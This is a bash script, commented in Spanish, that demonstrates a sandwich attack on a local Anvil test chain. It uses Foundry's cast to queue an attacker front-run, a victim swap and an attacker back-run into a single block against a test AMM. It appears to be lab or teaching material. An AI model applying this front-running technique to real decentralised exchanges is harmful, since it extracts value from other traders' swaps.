#!/bin/bash

# =============================================================================
# SANDWICH ATTACK EN UN SOLO BLOQUE
# =============================================================================

RPC="http://127.0.0.1:8545"

# Direcciones de contratos (cambiar segun tu deploy)
AMM=${AMM_ADDRESS:-"0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"}
USD=${USD_ADDRESS:-"0x5FbDB2315678afecb367f032d93F642f64180aa3"}

# Private keys de Anvil
OWNER_KEY="0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
ATTACKER_KEY="0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
VICTIM_KEY="0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a"

# Direcciones
ATTACKER="0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
VICTIM="0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"

# Montos (en wei)
ATTACKER_USD="3000000000000000000000"  # 3000 USD
VICTIM_USD="6000000000000000000000"    # 6000 USD
BACKRUN_ETH="909090909090909090"       # ~0.909 ETH (calculado previamente)

echo ""
echo "========== SANDWICH ATTACK - MISMO BLOQUE =========="
echo ""
echo "AMM: $AMM"
echo "USD: $USD"
echo "Attacker: $ATTACKER"
echo "Victim: $VICTIM"
echo ""

# =============================================================================
# SETUP (con mining normal)
# =============================================================================
echo "=== SETUP ==="

echo "Minteando USD para attacker y victim..."
cast send $USD "mint(address,uint256)" $ATTACKER 50000000000000000000000 \
    --private-key $OWNER_KEY --rpc-url $RPC > /dev/null

cast send $USD "mint(address,uint256)" $VICTIM 50000000000000000000000 \
    --private-key $OWNER_KEY --rpc-url $RPC > /dev/null

echo "Aprobando USD para attacker y victim..."
cast send $USD "approve(address,uint256)" $AMM 50000000000000000000000 \
    --private-key $ATTACKER_KEY --rpc-url $RPC > /dev/null

cast send $USD "approve(address,uint256)" $AMM 50000000000000000000000 \
    --private-key $VICTIM_KEY --rpc-url $RPC > /dev/null

echo "Setup completado!"
echo ""

# =============================================================================
# ESTADO INICIAL
# =============================================================================
echo "=== ESTADO INICIAL ==="
RESERVES=$(cast call $AMM "getReserves()" --rpc-url $RPC)
echo "Reservas: $RESERVES"
BLOCK_BEFORE=$(cast block-number --rpc-url $RPC)
echo "Bloque actual: $BLOCK_BEFORE"
echo ""

# =============================================================================
# DESACTIVAR AUTO-MINING
# =============================================================================
echo "=== DESACTIVANDO AUTO-MINING ==="
cast rpc anvil_setAutomine false --rpc-url $RPC > /dev/null
echo "Auto-mining desactivado"
echo ""

# =============================================================================
# ENVIAR LAS 3 TXs AL MEMPOOL (SIN MINAR)
# =============================================================================
echo "=== ENVIANDO TXs AL MEMPOOL ==="

echo "[TX 1] FRONT-RUN: Attacker compra ETH con 3000 USD"
cast send --async $AMM "tokenToEthSwap(uint256,uint256)" $ATTACKER_USD 0 \
    --private-key $ATTACKER_KEY --rpc-url $RPC 2>/dev/null
echo "  -> TX enviada al mempool"

echo "[TX 2] VICTIMA: Compra ETH con 6000 USD"
cast send --async $AMM "tokenToEthSwap(uint256,uint256)" $VICTIM_USD 0 \
    --private-key $VICTIM_KEY --rpc-url $RPC 2>/dev/null
echo "  -> TX enviada al mempool"

echo "[TX 3] BACK-RUN: Attacker vende ~0.909 ETH"
cast send --async $AMM "ethToTokenSwap(uint256)" 0 \
    --value $BACKRUN_ETH \
    --private-key $ATTACKER_KEY --rpc-url $RPC 2>/dev/null
echo "  -> TX enviada al mempool"

echo ""

# =============================================================================
# MINAR UN SOLO BLOQUE
# =============================================================================
echo "=== MINANDO UN SOLO BLOQUE ==="
cast rpc anvil_mine 1 --rpc-url $RPC > /dev/null
BLOCK_AFTER=$(cast block-number --rpc-url $RPC)
echo "Bloque minado: $BLOCK_AFTER"
echo ""

# =============================================================================
# ESTADO FINAL
# =============================================================================
echo "=== ESTADO FINAL ==="
read -r ETH_RES USD_RES <<< "$(cast call $AMM "getReserves()(uint256,uint256)" --rpc-url $RPC)"

echo "Reservas: ETH=$ETH_RES USD=$USD_RES"
echo ""

# Reactivar auto-mining
cast rpc anvil_setAutomine true --rpc-url $RPC > /dev/null

echo "========== FIN =========="
